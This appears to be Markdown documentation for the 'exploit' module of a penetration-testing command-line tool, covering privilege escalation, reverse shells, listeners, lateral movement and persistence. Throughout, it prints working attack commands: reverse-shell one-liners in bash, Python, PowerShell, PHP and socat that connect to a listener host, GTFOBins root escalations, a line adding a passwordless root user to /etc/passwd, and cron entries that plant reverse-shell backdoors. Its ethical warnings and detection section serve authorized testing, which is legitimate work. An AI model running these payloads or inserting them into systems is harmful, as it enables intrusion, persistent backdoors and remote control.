# EXPLOIT Domain Documentation

## Overview

The `exploit` domain provides a comprehensive exploitation framework for authorized penetration testing, including privilege escalation scanning, reverse shell generation, listener setup, lateral movement techniques, and persistence mechanisms. This domain replaces and works alongside tools like **Metasploit** (partial), **LinPEAS**, **WinPEAS**, **GTFOBins**, and **CrackMapExec**.

**Domain:** `exploit`

**Resource:** `payload`

**Status:** ‚úÖ Phase 1 (100% Complete)

**‚ö†Ô∏è CRITICAL SECURITY NOTICE:** This domain is designed exclusively for:
- ‚úÖ Authorized penetration testing engagements
- ‚úÖ CTF competitions
- ‚úÖ Bug bounty programs (within scope)
- ‚úÖ Your own systems for security testing
- ‚úÖ Educational and research purposes

**Unauthorized access to computer systems is ILLEGAL. Always obtain written authorization before testing.**

---

## Resource: `exploit payload`

**Description:** Exploitation framework providing privilege escalation detection, reverse shell payload generation, listener commands, lateral movement techniques, and persistence mechanisms for both Linux and Windows environments.

### Commands

#### 1. `privesc` - Privilege Escalation Scanner

Scan the local system for privilege escalation vectors, similar to LinPEAS/WinPEAS but integrated into redblue.

**Syntax:**
```bash
rb exploit payload privesc
```

**Arguments:**
- None (scans local system)

**Flags:**
- `-o, --output <format>` - Output format: `text`, `json`, `yaml`
  - Default: `text`

**What It Scans:**

**Linux Checks:**
- SUID/SGID binaries (especially GTFOBins candidates)
- Writable system paths in $PATH
- Sudo misconfigurations (NOPASSWD, wildcards)
- Cron jobs with weak permissions
- Kernel version (searchable for exploits)
- World-writable files in /etc
- SSH keys with weak permissions
- Password hashes in /etc/shadow
- Docker socket exposure
- Capabilities on binaries (getcap)

**Windows Checks:**
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated registry keys
- DLL hijacking opportunities
- Token privileges
- Scheduled tasks with weak permissions
- Autologon credentials in registry

**Examples:**

```bash
# Basic privilege escalation scan
rb exploit payload privesc

# JSON output for automation
rb exploit payload privesc -o json
```

**Sample Output (Text):**

```
‚ö†Ô∏è  AUTHORIZED USE ONLY

  Use ONLY for:
  ‚Ä¢ Authorized penetration testing engagements
  ‚Ä¢ CTF competitions
  ‚Ä¢ Bug bounty programs (within scope)
  ‚Ä¢ Your own systems for security testing
  ‚Ä¢ Educational and research purposes

  Unauthorized access to computer systems is ILLEGAL.
  Always obtain written authorization before testing.

üîç Privilege Escalation Scanner

Scanning for privilege escalation vectors... ‚úì

Found 4 potential vectors

üî¥ CRITICAL (2 vectors)
  ‚Ä¢ SUID Binary - /usr/bin/find with SUID bit
    Find binary can be used to execute commands with elevated privileges
    üí° find . -exec /bin/bash -p \; -quit
    üìñ https://gtfobins.github.io/gtfobins/find/

  ‚Ä¢ Sudo Misconfiguration - NOPASSWD on /usr/bin/vim
    User can run vim as root without password
    üí° sudo vim -c ':!/bin/bash'
    üìñ https://gtfobins.github.io/gtfobins/vim/

üü† HIGH (1 vector)
  ‚Ä¢ Writable /etc/passwd - World-writable password file
    /etc/passwd has weak permissions (666)
    üí° echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd

üîµ MEDIUM (1 vector)
  ‚Ä¢ Kernel Exploit - Linux 5.4.0 (outdated)
    Kernel version may be vulnerable to known exploits

Next Steps:
  1. Verify findings manually
  2. Check GTFOBins for SUID exploitation
  3. Search for kernel exploits: searchsploit 5.4.0
  4. Generate payload: rb exploit payload shell --type python --lhost <ip>
```

**Sample Output (JSON):**

```json
{
  "vectors": [
    {
      "severity": "critical",
      "category": "SUID Binary",
      "title": "/usr/bin/find with SUID bit",
      "description": "Find binary can be used to execute commands with elevated privileges",
      "exploit_technique": "find . -exec /bin/bash -p \\; -quit",
      "references": ["https://gtfobins.github.io/gtfobins/find/"]
    },
    {
      "severity": "critical",
      "category": "Sudo Misconfiguration",
      "title": "NOPASSWD on /usr/bin/vim",
      "description": "User can run vim as root without password",
      "exploit_technique": "sudo vim -c ':!/bin/bash'",
      "references": ["https://gtfobins.github.io/gtfobins/vim/"]
    }
  ],
  "total_vectors": 4,
  "critical": 2,
  "high": 1,
  "medium": 1
}
```

---

#### 2. `shell` - Reverse Shell Generator

Generate reverse shell payloads in multiple languages (bash, python, php, powershell, nc, socat, and more).

**Syntax:**
```bash
rb exploit payload shell --lhost <attacker_ip> --lport <port> [FLAGS]
```

**Arguments:**
- None (all configuration via flags)

**Flags:**
- `-t, --type <shell>` - Shell type
  - Options: `bash`, `python`, `perl`, `php`, `ruby`, `nc`, `powershell`, `socat`, `awk`, `java`, `node`
  - Default: `bash`
- `-h, --lhost <ip>` - Listener host (attacker IP) **[REQUIRED]**
- `-p, --lport <port>` - Listener port
  - Default: `4444`
- `--ssl` - Use SSL/TLS for encrypted shell (socat only)

**Supported Shell Types:**

| Type | Platform | Description |
|------|----------|-------------|
| `bash` | Linux/Unix | Bash /dev/tcp reverse shell |
| `python` | Cross-platform | Python socket shell (most reliable) |
| `perl` | Linux/Unix | Perl socket shell |
| `php` | Web servers | PHP reverse shell (for web exploitation) |
| `ruby` | Cross-platform | Ruby socket shell |
| `nc` | Cross-platform | Netcat reverse shell |
| `powershell` | Windows | PowerShell TCP reverse shell |
| `socat` | Cross-platform | Socat reverse shell (supports SSL) |
| `awk` | Linux/Unix | AWK reverse shell (rare, stealthy) |
| `java` | Cross-platform | Java reverse shell |
| `node` | Cross-platform | Node.js reverse shell |

**Examples:**

```bash
# Basic bash reverse shell
rb exploit payload shell --lhost 10.10.10.10 --lport 4444

# Python reverse shell (most reliable)
rb exploit payload shell --type python --lhost 192.168.1.100 --lport 443

# PowerShell shell for Windows
rb exploit payload shell --type powershell --lhost 10.10.10.10 --lport 8443

# PHP shell for web exploitation
rb exploit payload shell --type php --lhost 192.168.1.100 --lport 4444

# Encrypted socat shell with SSL
rb exploit payload shell --type socat --lhost 10.10.10.10 --lport 443 --ssl

# Netcat shell on custom port
rb exploit payload shell --type nc --lhost 192.168.1.100 --lport 9001

# Node.js shell
rb exploit payload shell --type node --lhost 10.10.10.10 --lport 4444
```

**Sample Output (Python Shell):**

```
‚ö†Ô∏è  AUTHORIZED USE ONLY

  Use ONLY for:
  ‚Ä¢ Authorized penetration testing engagements
  ‚Ä¢ CTF competitions
  ‚Ä¢ Bug bounty programs (within scope)
  ‚Ä¢ Your own systems for security testing
  ‚Ä¢ Educational and research purposes

  Unauthorized access to computer systems is ILLEGAL.
  Always obtain written authorization before testing.

üêö Reverse Shell Generator - python

  Listener Host: 10.10.10.10
  Listener Port: 4444
  Shell Type:    python

üìã Payload:
================================================================================
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
================================================================================

üéß Start Listener:
  nc -lvnp 4444
  OR
  rb exploit payload listener --port 4444

üîß Shell Stabilization (after connection):
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  Ctrl+Z (background)
  stty raw -echo; fg
  export TERM=xterm
```

**Sample Output (PowerShell Shell):**

```
üêö Reverse Shell Generator - powershell

  Listener Host: 192.168.1.100
  Listener Port: 443
  Shell Type:    powershell

üìã Payload:
================================================================================
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
================================================================================

üéß Start Listener:
  nc -lvnp 443
  OR
  rb exploit payload listener --port 443
```

---

#### 3. `listener` - Listener Command Generator

Generate listener commands for receiving reverse shells (netcat, socat, metasploit, etc.).

**Syntax:**
```bash
rb exploit payload listener [FLAGS]
```

**Arguments:**
- None

**Flags:**
- `-p, --port <port>` - Port to listen on
  - Default: `4444`
- `--ssl` - Generate SSL/TLS encrypted listener (socat)

**Examples:**

```bash
# Basic listener on port 4444
rb exploit payload listener

# Custom port
rb exploit payload listener --port 8443

# SSL/TLS encrypted listener
rb exploit payload listener --port 443 --ssl
```

**Sample Output (Basic):**

```
‚ö†Ô∏è  AUTHORIZED USE ONLY

  Use ONLY for:
  ‚Ä¢ Authorized penetration testing engagements
  ‚Ä¢ CTF competitions
  ‚Ä¢ Bug bounty programs (within scope)
  ‚Ä¢ Your own systems for security testing
  ‚Ä¢ Educational and research purposes

  Unauthorized access to computer systems is ILLEGAL.
  Always obtain written authorization before testing.

üéß Listener Commands

  Port: 4444

üéß Start Listener:

1. Netcat (Traditional):
   nc -lvnp 4444

2. Netcat (OpenBSD):
   nc -lvp 4444

3. Ncat (Nmap):
   ncat -lvnp 4444

4. Socat:
   socat TCP-LISTEN:4444,reuseaddr,fork STDOUT

5. Metasploit:
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"

6. PowerShell (Windows):
   $listener = [System.Net.Sockets.TcpListener]4444;$listener.start();$client = $listener.AcceptTcpClient();
```

**Sample Output (SSL):**

```
üéß Listener Commands

  Port: 443

üéß Start Listener:

1. Netcat (Traditional):
   nc -lvnp 443

2. Netcat (OpenBSD):
   nc -lvp 443

3. Ncat (Nmap):
   ncat -lvnp 443

4. Socat with SSL:
   # Generate certificate:
   openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
   cat shell.key shell.crt > shell.pem

   # Start listener:
   socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 STDOUT

5. Metasploit:
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 443; run"

6. PowerShell (Windows):
   $listener = [System.Net.Sockets.TcpListener]443;$listener.start();$client = $listener.AcceptTcpClient();
```

---

#### 4. `lateral` - Lateral Movement Techniques

Display lateral movement techniques for post-exploitation (SSH tunneling, PSExec, WMI, Pass-the-Hash, etc.).

**Syntax:**
```bash
rb exploit payload lateral [technique]
```

**Arguments:**
- `[technique]` - Optional specific technique to display (see list below)

**Flags:**
- `-o, --output <format>` - Output format: `text`, `json`
  - Default: `text`

**Available Techniques:**

| Technique | Description | Platform |
|-----------|-------------|----------|
| `ssh_key_reuse` | SSH Key Reuse across multiple hosts | Linux/Unix |
| `ssh_tunneling` | SSH Tunneling & Port Forwarding | Linux/Unix |
| `psexec` | PsExec remote execution | Windows |
| `wmiexec` | WMI remote execution | Windows |
| `pass_the_hash` | Pass-the-Hash authentication | Windows |
| `smb_relay` | SMB Relay Attack | Windows |
| `nfs_mount` | NFS Mount Exploitation | Linux/Unix |
| `rsync_abuse` | Rsync Abuse | Linux/Unix |
| `password_spraying` | Password Spraying across multiple hosts | Cross-platform |
| `metasploit_pivot` | Metasploit Pivoting | Cross-platform |
| `chisel_tunnel` | Chisel Tunneling | Cross-platform |

**Examples:**

```bash
# List all lateral movement techniques
rb exploit payload lateral

# Show specific technique
rb exploit payload lateral ssh_tunneling

# Show PSExec technique
rb exploit payload lateral psexec

# Show Pass-the-Hash
rb exploit payload lateral pass_the_hash
```

**Sample Output (All Techniques):**

```
‚ö†Ô∏è  AUTHORIZED USE ONLY

  Use ONLY for:
  ‚Ä¢ Authorized penetration testing engagements
  ‚Ä¢ CTF competitions
  ‚Ä¢ Bug bounty programs (within scope)
  ‚Ä¢ Your own systems for security testing
  ‚Ä¢ Educational and research purposes

  Unauthorized access to computer systems is ILLEGAL.
  Always obtain written authorization before testing.

üåê Lateral Movement Techniques

Available Techniques:

  üîë SSH Key Reuse
    rb exploit payload lateral ssh_key_reuse

  üåê SSH Tunneling & Port Forwarding
    rb exploit payload lateral ssh_tunneling

  üíª PsExec (Windows)
    rb exploit payload lateral psexec

  ‚öôÔ∏è  WMI Execution (Windows)
    rb exploit payload lateral wmiexec

  üîê Pass-the-Hash (Windows)
    rb exploit payload lateral pass_the_hash

  üîÑ SMB Relay Attack
    rb exploit payload lateral smb_relay

  üìÅ NFS Mount Exploitation
    rb exploit payload lateral nfs_mount

  üì¶ Rsync Abuse
    rb exploit payload lateral rsync_abuse

  üåßÔ∏è  Password Spraying
    rb exploit payload lateral password_spraying

  üîÄ Metasploit Pivoting
    rb exploit payload lateral metasploit_pivot

  üîß Chisel Tunneling
    rb exploit payload lateral chisel_tunnel

Works alongside:
  ‚Ä¢ CrackMapExec - Credential spraying
  ‚Ä¢ BloodHound - Active Directory enumeration
  ‚Ä¢ Impacket - SMB/WMI tools
  ‚Ä¢ Metasploit - Pivoting framework
```

**Sample Output (SSH Tunneling):**

```
üåê Lateral Movement Techniques

  Technique: ssh_tunneling

üåê SSH Tunneling & Port Forwarding

1. Local Port Forwarding:
   ssh -L 8080:internal-server:80 user@jump-host
   # Access internal-server:80 via localhost:8080

2. Remote Port Forwarding:
   ssh -R 8080:localhost:80 user@external-server
   # Expose localhost:80 on external-server:8080

3. Dynamic Port Forwarding (SOCKS Proxy):
   ssh -D 1080 user@jump-host
   # Configure browser/tools to use localhost:1080 as SOCKS proxy

4. SSH Tunnel through Multiple Hops:
   ssh -J jump1,jump2 user@target

5. Persistent Tunnel (autossh):
   autossh -M 0 -f -N -L 8080:internal:80 user@jump-host

Common Use Cases:
  ‚Ä¢ Access internal web applications
  ‚Ä¢ Pivot through compromised hosts
  ‚Ä¢ Bypass firewall restrictions
  ‚Ä¢ Create covert communication channels
```

---

#### 5. `persist` - Persistence Mechanisms

Display persistence mechanisms for maintaining access to compromised systems (cron, systemd, registry, scheduled tasks, etc.).

**Syntax:**
```bash
rb exploit payload persist [mechanism]
```

**Arguments:**
- `[mechanism]` - Optional specific persistence mechanism (see list below)

**Flags:**
- `-o, --output <format>` - Output format: `text`, `json`
  - Default: `text`

**Available Mechanisms:**

**Linux:**
| Mechanism | Description | Detection Risk |
|-----------|-------------|----------------|
| `cron_persistence` | Cron Job Persistence | MEDIUM |
| `ssh_key_persistence` | SSH Authorized Keys | LOW |
| `systemd_service` | systemd Service Creation | MEDIUM |
| `bashrc_persistence` | .bashrc/.profile Injection | LOW |

**Windows:**
| Mechanism | Description | Detection Risk |
|-----------|-------------|----------------|
| `registry_run_key` | Registry Run Keys | MEDIUM |
| `scheduled_task` | Scheduled Tasks | MEDIUM |
| `wmi_persistence` | WMI Event Subscriptions | HIGH |
| `sticky_keys` | Sticky Keys Backdoor | CRITICAL |

**Examples:**

```bash
# List all persistence mechanisms
rb exploit payload persist

# Show Linux cron persistence
rb exploit payload persist cron_persistence

# Show Windows registry persistence
rb exploit payload persist registry_run_key

# Show SSH key persistence
rb exploit payload persist ssh_key_persistence
```

**Sample Output (All Mechanisms):**

```
‚ö†Ô∏è  AUTHORIZED USE ONLY

  Use ONLY for:
  ‚Ä¢ Authorized penetration testing engagements
  ‚Ä¢ CTF competitions
  ‚Ä¢ Bug bounty programs (within scope)
  ‚Ä¢ Your own systems for security testing
  ‚Ä¢ Educational and research purposes

  Unauthorized access to computer systems is ILLEGAL.
  Always obtain written authorization before testing.

üîê Persistence Mechanisms

üêß Linux Persistence:

  ‚è∞ Cron Job Persistence
    rb exploit payload persist cron_persistence

  üîë SSH Authorized Keys
    rb exploit payload persist ssh_key_persistence

  ‚öôÔ∏è  systemd Service
    rb exploit payload persist systemd_service

  üìù .bashrc/.profile Injection
    rb exploit payload persist bashrc_persistence

ü™ü Windows Persistence:

  üìã Registry Run Keys
    rb exploit payload persist registry_run_key

  ‚è∞ Scheduled Tasks
    rb exploit payload persist scheduled_task

  ‚öôÔ∏è  WMI Event Subscriptions
    rb exploit payload persist wmi_persistence

  üîê Sticky Keys Backdoor
    rb exploit payload persist sticky_keys

‚ö†Ô∏è  Detection Risk:
  ‚Ä¢ Cron/Scheduled Tasks: MEDIUM (visible in cron/task list)
  ‚Ä¢ SSH Keys: LOW (requires checking authorized_keys)
  ‚Ä¢ systemd/Registry: MEDIUM (visible in service/registry list)
  ‚Ä¢ WMI Subscriptions: HIGH (advanced defenders check WMI)
  ‚Ä¢ Sticky Keys: CRITICAL (easily detected, requires reboot)
```

**Sample Output (Cron Persistence):**

```
üîê Persistence Mechanisms

  Mechanism: cron_persistence

‚è∞ Cron Job Persistence (Linux)

1. User Crontab Persistence:
   # Add to current user's crontab
   (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'") | crontab -

2. System-wide Cron (/etc/crontab):
   echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" >> /etc/crontab

3. Cron Directory Drop (/etc/cron.d/):
   echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" > /etc/cron.d/persistence

4. Hourly Cron Script:
   cat <<'EOF' > /etc/cron.hourly/update
   #!/bin/bash
   bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
   EOF
   chmod +x /etc/cron.hourly/update

Detection:
  ‚Ä¢ Defenders check: crontab -l, /etc/crontab, /etc/cron.d/*
  ‚Ä¢ Risk: MEDIUM
  ‚Ä¢ Mitigation: Monitor cron file changes, baseline cron jobs

Cleanup:
  crontab -r  # Remove user crontab
  rm /etc/cron.d/persistence
  rm /etc/cron.hourly/update
```

---

## Configuration

The EXPLOIT domain uses project-level configuration from `.redblue.yaml`:

```yaml
exploit:
  # Default listener port
  default_port: 4444

  # Default shell type
  default_shell: bash

  # Show ethical warning (recommended: true)
  show_warning: true

  # Output format
  output_format: text
```

**Global config location:** `~/.config/redblue/config.toml`
**Project config:** `./.redblue.yaml` (takes precedence)

---

## Common Use Cases

### 1. **Post-Exploitation Workflow**

After gaining initial access:

```bash
# Step 1: Scan for privilege escalation vectors
rb exploit payload privesc

# Step 2: Generate reverse shell for persistence
rb exploit payload shell --type python --lhost 10.10.10.10 --lport 4444

# Step 3: Set up listener
rb exploit payload listener --port 4444

# Step 4: Establish lateral movement
rb exploit payload lateral ssh_tunneling

# Step 5: Install persistence
rb exploit payload persist ssh_key_persistence
```

### 2. **CTF Competition**

Quick payload generation during CTFs:

```bash
# Generate Python shell (most reliable)
rb exploit payload shell --type python --lhost 10.10.14.5 --lport 9001

# Check for easy wins (SUID, sudo)
rb exploit payload privesc

# Get lateral movement ideas
rb exploit payload lateral
```

### 3. **Bug Bounty Testing**

Web application exploitation:

```bash
# Generate PHP shell for file upload
rb exploit payload shell --type php --lhost 192.168.1.100 --lport 443

# Set up encrypted listener
rb exploit payload listener --port 443 --ssl

# Check for privilege escalation after web shell
rb exploit payload privesc
```

### 4. **Penetration Testing Engagement**

Professional pentest workflow:

```bash
# Initial access: Generate PowerShell payload
rb exploit payload shell --type powershell --lhost 10.10.10.10 --lport 8443

# Start listener
rb exploit payload listener --port 8443

# Post-exploitation: Check privilege escalation
rb exploit payload privesc -o json > privesc_scan.json

# Establish persistence (client-approved)
rb exploit payload persist registry_run_key

# Lateral movement reconnaissance
rb exploit payload lateral pass_the_hash
```

---

## Tool Equivalents

The EXPLOIT domain replaces or complements these traditional tools:

| Traditional Tool | redblue Command | Notes |
|-----------------|----------------|-------|
| **LinPEAS** | `rb exploit payload privesc` | Privilege escalation scanner (Linux) |
| **WinPEAS** | `rb exploit payload privesc` | Privilege escalation scanner (Windows) |
| **GTFOBins** | `rb exploit payload privesc` | SUID/sudo exploitation database |
| **Metasploit (msfvenom)** | `rb exploit payload shell` | Reverse shell generation |
| **Metasploit (handler)** | `rb exploit payload listener` | Listener setup |
| **CrackMapExec** | `rb exploit payload lateral` | Lateral movement (partial) |
| **Impacket (psexec)** | `rb exploit payload lateral psexec` | PSExec commands |
| **Impacket (wmiexec)** | `rb exploit payload lateral wmiexec` | WMI execution |
| **PowerSploit** | `rb exploit payload persist` | Windows persistence |
| **BloodHound** | Works alongside | AD enumeration (complementary) |

---

## Technical Details

### Shell Type Implementations

**Bash (/dev/tcp):**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

**Python (socket):**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**PowerShell (TCPClient):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**PHP (fsockopen):**
```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**Socat (SSL):**
```bash
socat OPENSSL:10.10.10.10:443,verify=0 EXEC:/bin/bash
```

### Privilege Escalation Categories

**SUID/SGID Checks:**
- Find all SUID binaries: `find / -perm -4000 2>/dev/null`
- Cross-reference with GTFOBins database
- Check for custom binaries with SUID

**Sudo Misconfigurations:**
- NOPASSWD entries
- Wildcard abuse (tar, rsync, etc.)
- Environment variable preservation ($PATH, LD_PRELOAD)
- Relative path exploitation

**Kernel Exploits:**
- Version detection (uname -a)
- Known CVE database lookup
- Dirty COW, Dirty Pipe, PwnKit, etc.

**Windows Privilege Escalation:**
- Unquoted service paths
- Weak service permissions (sc qc, accesschk)
- AlwaysInstallElevated (reg query)
- Token privileges (whoami /priv)

---

## Security Considerations

### Ethical Use

**ALWAYS:**
- ‚úÖ Obtain written authorization before testing
- ‚úÖ Stay within defined scope
- ‚úÖ Document all actions
- ‚úÖ Report findings professionally
- ‚úÖ Clean up persistence mechanisms after testing

**NEVER:**
- ‚ùå Test systems without authorization
- ‚ùå Exceed scope of engagement
- ‚ùå Leave backdoors after engagement ends
- ‚ùå Use techniques for malicious purposes
- ‚ùå Share exploits publicly without disclosure process

### Detection & Blue Team

**Shell Detection:**
- Network monitoring: Unusual outbound connections
- Process monitoring: Unexpected child processes
- Log analysis: Base64 payloads, PowerShell execution

**Privilege Escalation Detection:**
- File integrity monitoring (SUID changes)
- Sudo log monitoring
- auditd rules for sensitive binaries

**Persistence Detection:**
- Cron/scheduled task monitoring
- SSH key change detection
- Registry monitoring (Windows)
- systemd unit file changes

---

## Troubleshooting

### Shell Won't Connect

**Problem:** Reverse shell payload doesn't connect back

**Solutions:**
1. Check firewall rules on attacker machine
2. Verify listener is running (netstat -tlnp)
3. Ensure correct IP address (check with `ip a` or `ifconfig`)
4. Try different shell type (Python is most reliable)
5. Test with telnet first: `telnet <lhost> <lport>`
6. Check if target has outbound filtering

### Privilege Escalation Not Found

**Problem:** No vectors found but system seems vulnerable

**Solutions:**
1. Run LinPEAS/WinPEAS for deeper analysis
2. Check manually: `sudo -l`, `find / -perm -4000`
3. Enumerate all writable files: `find / -writable 2>/dev/null`
4. Check kernel version for known exploits
5. Review cron jobs: `cat /etc/crontab`, `ls /etc/cron.*`

### Persistence Mechanism Failed

**Problem:** Persistence doesn't survive reboot

**Solutions:**
1. Verify file permissions (chmod +x)
2. Check cron syntax (crontab -l)
3. Test service manually: `systemctl status <service>`
4. Review system logs: `journalctl -xe`
5. Ensure path is absolute (no relative paths)

---

## See Also

- [NETWORK Domain](./NETWORK.md) - Initial reconnaissance and port scanning
- [WEB Domain](./WEB.md) - Web application exploitation
- [RECON Domain](./RECON.md) - Information gathering before exploitation
- [DATABASE Domain](./DATABASE.md) - Persist exploitation findings

**External Resources:**
- LinPEAS: https://github.com/carlospolop/PEASS-ng
- GTFOBins: https://gtfobins.github.io/
- LOLBAS (Windows): https://lolbas-project.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/

---

**‚ö†Ô∏è REMEMBER: This tool is for authorized security testing only. Unauthorized access is illegal.**
